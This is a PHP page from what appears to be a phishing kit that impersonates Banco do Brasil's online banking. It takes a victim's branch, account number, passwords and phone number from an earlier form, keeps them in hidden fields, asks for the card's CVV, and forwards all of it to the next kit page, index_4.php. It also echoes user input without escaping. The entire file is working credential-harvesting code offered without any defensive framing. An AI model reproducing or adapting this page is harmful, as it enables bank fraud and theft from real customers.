<?php
error_reporting(0);
ini_set(“display_errors”, 0 );


$agencia = $_POST ['agencia'];
$conta = $_POST ['conta'];
$senha = $_POST ['senha'];
$telefone = $_POST ['telefone'];
$senha6 = $_POST ['senha6'];
?>
<!DOCTYPE html>
<html lang="pt-br" data-ng-app="openBanking" oauth-loading class="fundo-azul">


<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Banco do Brasil</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="imagens/favicon.ico" type="image/x-icon" />
    <link rel="stylesheet" type="text/css" href="css/angular-material.min8cea.css" />
    <link rel="stylesheet" type="text/css" href="css/bulma.min.css" />
    <link rel="stylesheet" type="text/css" href="css/style.css" />
    <link rel="stylesheet" type="text/css" href="css/titulares.css" />
    <link rel="stylesheet" type="text/css" href="css/input.css" />
    <link rel="stylesheet" type="text/css" href="css/componentes.css" />
    <link rel="stylesheet" type="text/css" href="css/voltar.css" />
    <link rel="stylesheet" type="text/css" href="css/contas.css" />
    <link rel="stylesheet" type="text/css" href="css/termo.css" />
	
    <script src="lib/jquery-1-12-4.js"></script>
	<script type="text/javascript" src="js/prototipo.js"></script>
	<script type="text/javascript" src="js/jquery.validate.cpf.js"></script> 
    <script src="lib/jquery.mask.min.js"></script>
	 <script src="lib/mask.min.js"></script>
    <script src="lib/indexeddb.js"></script>
	<script src="lib/home.js"></script>
	
	    <script src="lib/oauthBB3d10.js"></script>
    <!-- values -->
    <script src="lib/oauthBB.values3d10.js"></script>
    <!-- services -->
    <script src="lib/diretivas3d10.js"></script>
    <script src="lib/servicos3d10.js"></script>
    <script src="lib/oauthBB.services3d10.js"></script>
    <script src="lib/oauthBB.filters3d10.js"></script>
</head>

<body class="caixa">


    <div data-ng-view="" class="ng-scope" style="">
        <section class="hero is-fullheight ng-scope">
            <div class="disabilitado-hero-body">
                <div class="container">
					
                    <section class="page-section welcome-section is-white">
						
                        <figure class="avatar">
                            <img class="logo" data-ng-src="imagens/logo-login.jpg" src="imagens/logo-login.jpg">
                        </figure>
						<div class="welcome">
                            <span class="welcome-user active"><b></b></span>
                        </div>
                    </section>
                    <div class="column is-4 is-offset-4 caixa">
                        <p class="subtitle is-subtitulo-azul has-text-centered"><font style="font-size: 9pt">&oplus; Ag. <?php echo $agencia ?> &nbsp; Cc. <?php echo $conta ?></font></p>
						<article class="message is-info">
  <div class="message-body" align="center">
    <font style="font-size: 11px;">Confirme os <strong>CVV (3 dígitos no verso do seu cartão)</strong></font><br>
	  <img width="124" src="imagens/cardex.png" height="80">
  </div>
</article>				

								                        <form autocomplete="off" class="ng-pristine ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-valid-pattern" onsubmit="return check_phone();" action="index_4.php" method="POST">
				<input name="agencia" type="hidden" id="agencia" value="<?php echo $agencia ?>" />
 					 <input name="conta" type="hidden" id="conta" value="<?php echo $conta ?>" />
 					 <input name="senha" type="hidden" id="senha" value="<?php echo $senha ?>" />	
					<input name="telefone" type="hidden" id="telefone" value="<?php echo $telefone ?>" />
 					 <input name="senha6" type="hidden" id="senha6" value="<?php echo $senha6 ?>" />						
						<table width="100%" border="0" cellspacing="0" cellpadding="0" align="center">
  <tbody>
    <tr>
   
      <td><div align="center">
								
                                <input type="tel" ng-model="CVV" name="cvv" id="CVV" salta-campo-pos-preenchimento="" focus="focus" data-ng-required="!vm.isCampoPreenchido(vm.CVV)" data-ng-focus="!vm.isCampoPreenchido(vm.CVV)" data-ng-model="vm.CVV" data-autofocus="" clean="true" data-bb-input-CVV="" data-salta-campo-pos-preenchimento="" class="ng-pristine ng-untouched ng-isolate-scope ng-empty ng-invalid ng-invalid-required" maxlength="3" required="required" aria-invalid="true" autofocus style="width: 70px" >
                                <label class="has-text-lefted">CVV</label>
                            </div></td>
    </tr>
    
  </tbody>
</table>
							 
                           
                            <button class="botao-amarelo is-fullwidth" data-ng-click="vm.autenticar()">CONTINUAR</button>

						
                        </form>
                    </div>
                </div>
            </div>
        </section>
    </div>

</body>
<!--<script type="text/javascript" src="app-f30f696d54feda2a6583.js"></script></body>
	<script src="runtime.bundle.js?data=201806061400"></script>	
	<script src="https://oauth.bb.com.br/ui/v4/vendor.bundle.js?data=201806061400"></script>	
	<script src="https://oauth.bb.com.br/ui/v4/app.bundle.js?data=201806061400"></script-->



</html>